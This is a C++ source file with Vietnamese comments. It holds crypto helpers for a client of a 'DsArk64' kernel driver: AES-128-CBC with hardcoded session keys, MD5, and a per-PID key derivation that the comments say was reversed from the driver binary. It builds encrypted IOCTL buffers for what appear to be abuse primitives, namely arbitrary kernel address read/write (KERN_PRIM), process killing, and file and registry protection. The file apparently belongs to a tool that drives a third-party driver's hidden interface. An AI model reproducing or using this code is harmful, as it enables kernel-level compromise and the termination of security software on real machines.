/*
 * dsark64_crypto.cpp
 *
 * Crypto helpers cho DsArk64 IOCTL layer.
 * Sử dụng Windows BCrypt (CNG) — không có dependency ngoài bcrypt.lib.
 *
 * Các scheme:
 *  1. Session AES-128-CBC  (static key DSARK_SESSION_KEY + IV DSARK_SESSION_IV)
 *     → dùng cho IOCTL_DSARK_FILE_PROT, IOCTL_DSARK_REG_PROT, IOCTL_DSARK_KERN_PRIM
 *
 *  2. Per-PID AES-128-CBC  (derived key + DSARK_KILL_BASE_IV)
 *     → dùng cho IOCTL_DSARK_ENC_KILL / IOCTL_DSARK_ENC_KILL_B
 *
 *  3. MD5 integrity        (BCrypt MD5)
 *     → dùng để build header cho IOCTL_DSARK_KERN_PRIM
 */

#include "dsark64.h"
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

// ---------------------------------------------------------------------------
// Internal: AES-128-CBC via BCrypt
//
// FIX (Bug 6): pKeyObj must be freed AFTER BCryptDestroyKey() because BCrypt
// keeps an internal reference to the key object buffer until then.
// ---------------------------------------------------------------------------

static BOOL AesCbcOp(const uint8_t* in, DWORD size,
                     const uint8_t key[16], const uint8_t iv_in[16],
                     uint8_t* out, BOOL bEncrypt)
{
    if (!in || !out || size == 0 || (size % 16) != 0)
        return FALSE;

    BCRYPT_ALG_HANDLE  hAlg    = NULL;
    BCRYPT_KEY_HANDLE  hKey    = NULL;
    PUCHAR             pKeyObj = NULL;   // FIX: lifted to function scope
    NTSTATUS           st;
    BOOL               ok      = FALSE;
    ULONG              cbResult;

    // — 1. Open AES algorithm provider
    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) goto cleanup;

    // — 2. Set CBC chaining mode
    st = BCryptSetProperty(hAlg,
                           BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                           (ULONG)(sizeof(BCRYPT_CHAIN_MODE_CBC)),
                           0);
    if (!BCRYPT_SUCCESS(st)) goto cleanup;

    // — 3. Import key (16 bytes, AES-128)
    {
        ULONG cbKeyObj = 0;
        st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                               (PUCHAR)&cbKeyObj, sizeof(cbKeyObj),
                               &cbResult, 0);
        if (!BCRYPT_SUCCESS(st)) goto cleanup;

        pKeyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);
        if (!pKeyObj) goto cleanup;

        st = BCryptGenerateSymmetricKey(hAlg, &hKey,
                                        pKeyObj, cbKeyObj,
                                        (PUCHAR)key, 16, 0);
        if (!BCRYPT_SUCCESS(st)) goto cleanup;
    }

    // — 4. Copy IV (BCrypt modifies it during CBC, so we need a local copy)
    uint8_t iv_copy[16];
    memcpy(iv_copy, iv_in, 16);

    // — 5. Encrypt or decrypt
    if (bEncrypt) {
        st = BCryptEncrypt(hKey,
                           (PUCHAR)in,  size, NULL,
                           iv_copy, 16,
                           out,         size, &cbResult,
                           0);
    } else {
        st = BCryptDecrypt(hKey,
                           (PUCHAR)in,  size, NULL,
                           iv_copy, 16,
                           out,         size, &cbResult,
                           0);
    }
    ok = BCRYPT_SUCCESS(st);

cleanup:
    // FIX (Bug 6): Destroy key FIRST, then free key object buffer.
    // BCrypt requires the key object buffer to remain valid until BCryptDestroyKey.
    if (hKey)    BCryptDestroyKey(hKey);
    if (pKeyObj) HeapFree(GetProcessHeap(), 0, pKeyObj);
    if (hAlg)    BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

// ---------------------------------------------------------------------------
// Public: AES-128-CBC encrypt / decrypt
// ---------------------------------------------------------------------------

extern "C" BOOL DsArkAesCbcEncrypt(const uint8_t* plain, DWORD size,
                                    const uint8_t key[16], const uint8_t iv[16],
                                    uint8_t* cipher)
{
    return AesCbcOp(plain, size, key, iv, cipher, TRUE);
}

extern "C" BOOL DsArkAesCbcDecrypt(const uint8_t* cipher, DWORD size,
                                    const uint8_t key[16], const uint8_t iv[16],
                                    uint8_t* plain)
{
    return AesCbcOp(cipher, size, key, iv, plain, FALSE);
}

// ---------------------------------------------------------------------------
// Public: MD5 hash via BCrypt
//
// FIX (Bug 6): pHashObj must be freed AFTER BCryptDestroyHash().
// Previous code freed it early in the BCryptCreateHash failure path but leaked
// it on BCryptHashData / BCryptFinishHash failure paths.
// ---------------------------------------------------------------------------

extern "C" BOOL DsArkMD5(const uint8_t* data, DWORD size, uint8_t hash[16])
{
    BCRYPT_ALG_HANDLE  hAlg     = NULL;
    BCRYPT_HASH_HANDLE hHash    = NULL;
    PUCHAR             pHashObj = NULL;  // FIX: lifted to function scope
    NTSTATUS           st;
    BOOL               ok       = FALSE;
    ULONG              cbResult;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;

    {
        ULONG cbHashObj = 0;
        st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                               (PUCHAR)&cbHashObj, sizeof(cbHashObj),
                               &cbResult, 0);
        if (!BCRYPT_SUCCESS(st)) goto done;

        pHashObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbHashObj);
        if (!pHashObj) goto done;

        st = BCryptCreateHash(hAlg, &hHash, pHashObj, cbHashObj, NULL, 0, 0);
        if (!BCRYPT_SUCCESS(st)) goto done;
    }

    st = BCryptHashData(hHash, (PUCHAR)data, size, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;

    st = BCryptFinishHash(hHash, hash, 16, 0);
    ok = BCRYPT_SUCCESS(st);

done:
    // FIX (Bug 6): Destroy hash FIRST, then free hash object buffer.
    if (hHash)    BCryptDestroyHash(hHash);
    if (pHashObj) HeapFree(GetProcessHeap(), 0, pHashObj);
    if (hAlg)     BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

// ---------------------------------------------------------------------------
// Public: per-PID AES key derivation (for 0x8086300C / 0x80863010)
//
// Algorithm (reversed from sub_136FC @ 0x136FC):
//   hash = MD5(pid as DWORD LE)
//   for i in 0..15:
//       if (pid >> i) & 1:
//           derivedKey[i] = hash[i]
//       else:
//           derivedKey[i] = DSARK_KILL_BASE_KEY[i]
// ---------------------------------------------------------------------------

extern "C" void DsArkDeriveKillKey(DWORD callerPid, uint8_t derivedKey[16])
{
    uint8_t hash[16] = {0};
    DsArkMD5((uint8_t*)&callerPid, 4, hash);

    memcpy(derivedKey, DSARK_KILL_BASE_KEY, 16);

    for (int i = 0; i < 16; i++) {
        if ((callerPid >> i) & 1u) {
            derivedKey[i] = hash[i];
        }
    }
}

// ---------------------------------------------------------------------------
// Internal helper: build & encrypt a KERN_PRIM buffer
//
//  Plaintext layout:
//    [0x00..0x0F]  MD5(plaintext[0x10..N-1])
//    [0x10..0x13]  type      (DWORD)
//    [0x14..0x17]  dataSize  (DWORD)
//    [0x18..0x1F]  addr      (UINT64)
//    [0x20..0x20+dataSize-1] data (for write) / zeroes (for read output)
//
//  Returns heap-allocated encrypted buffer of *pBufSize bytes.
//  Caller must HeapFree.
// ---------------------------------------------------------------------------
uint8_t* BuildKernPrimBuf(DWORD type, uint64_t addr,
                           const uint8_t* data, DWORD dataSize,
                           DWORD* pBufSize)
{
    DWORD bufSize = (DWORD)KPRIM_BUF_SIZE(dataSize);
    if (bufSize < 0x30) bufSize = 0x30;   // minimum 48 bytes (0x20 hdr + 0x10 data)
    if (bufSize > 0x400) return NULL;

    uint8_t* plain = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
    if (!plain) return NULL;

    // Build payload at offset 0x10
    *(DWORD*  )(plain + 0x10) = type;
    *(DWORD*  )(plain + 0x14) = dataSize;
    *(uint64_t*)(plain + 0x18) = addr;
    if (data && dataSize > 0)
        memcpy(plain + 0x20, data, dataSize);

    // Compute MD5 over [0x10 .. bufSize-1], store at [0x00..0x0F]
    DsArkMD5(plain + 0x10, bufSize - 0x10, plain);

    // AES-128-CBC encrypt entire buffer
    uint8_t* cipher = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
    if (!cipher) { HeapFree(GetProcessHeap(), 0, plain); return NULL; }

    BOOL ok = DsArkAesCbcEncrypt(plain, bufSize,
                                  DSARK_SESSION_KEY, DSARK_SESSION_IV,
                                  cipher);
    HeapFree(GetProcessHeap(), 0, plain);

    if (!ok) { HeapFree(GetProcessHeap(), 0, cipher); return NULL; }

    *pBufSize = bufSize;
    return cipher;
}

// ---------------------------------------------------------------------------
// Internal helper: build & encrypt a PROT (file or registry) buffer
//
//  Plaintext layout (exactly PROT_BUF_SIZE = 0x400 bytes):
//    [0x00..0x03]  checksum  (DWORD: chosen so sum of ALL DWORDs in buf == 0)
//    [0x04..0x07]  command   (DWORD)
//    [0x08..0x0B]  pathLen   (DWORD: byte length of UTF-16 path)
//    [0x0C..0x0C+pathLen-1]  path (UTF-16, no null terminator)
//    [...pad to 0x400 with zeroes]
//
//  Returns heap-allocated encrypted buffer (PROT_BUF_SIZE bytes).
//  Caller must HeapFree.
// ---------------------------------------------------------------------------
uint8_t* BuildProtBuf(DWORD command, const WCHAR* path)
{
    uint8_t* plain = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PROT_BUF_SIZE);
    if (!plain) return NULL;

    DWORD pathBytes = 0;
    if (path) pathBytes = (DWORD)(wcslen(path) * sizeof(WCHAR));

    // Sanity: path must fit (header = 12 bytes, buffer = 0x400)
    if (pathBytes > PROT_BUF_SIZE - 12) {
        HeapFree(GetProcessHeap(), 0, plain); return NULL;
    }

    *(DWORD*)(plain + 0x00) = 0;         // checksum placeholder
    *(DWORD*)(plain + 0x04) = command;
    *(DWORD*)(plain + 0x08) = pathBytes;
    if (path && pathBytes) memcpy(plain + 0x0C, path, pathBytes);

    // Compute checksum: sum of all DWORDs in buffer must equal 0 mod 2^32.
    // Adjust first DWORD (checksum field) to satisfy the constraint.
    DWORD sum = 0;
    for (DWORD i = 0x04; i < PROT_BUF_SIZE; i += 4)
        sum += *(DWORD*)(plain + i);
    *(DWORD*)(plain + 0x00) = (DWORD)(0u - sum);  // checksum = -sum (mod 2^32)

    // AES-128-CBC encrypt
    uint8_t* cipher = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PROT_BUF_SIZE);
    if (!cipher) { HeapFree(GetProcessHeap(), 0, plain); return NULL; }

    BOOL ok = DsArkAesCbcEncrypt(plain, PROT_BUF_SIZE,
                                  DSARK_SESSION_KEY, DSARK_SESSION_IV,
                                  cipher);
    HeapFree(GetProcessHeap(), 0, plain);

    if (!ok) { HeapFree(GetProcessHeap(), 0, cipher); return NULL; }
    return cipher;
}
